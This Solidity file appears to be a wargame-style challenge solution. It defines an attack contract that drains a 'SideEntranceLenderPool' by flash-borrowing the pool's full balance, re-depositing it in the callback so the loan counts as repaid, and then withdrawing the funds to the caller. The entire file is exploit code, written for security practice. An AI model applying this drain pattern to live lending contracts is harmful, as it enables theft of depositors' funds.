// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {IFlashLoanEtherReceiver, SideEntranceLenderPool} from "src/side-entrance/SideEntranceLenderPool.sol";

contract SideEntranceAttack is IFlashLoanEtherReceiver {
    SideEntranceLenderPool pool;

    constructor(address _pool) {
        pool = SideEntranceLenderPool(_pool);
    }

    receive() external payable {}

    function exploit() external {
        pool.flashLoan(address(pool).balance);
        pool.withdraw();
        payable(msg.sender).transfer(address(this).balance);
    }

    function execute() external payable {
        pool.deposit{value: msg.value}();
    }
}
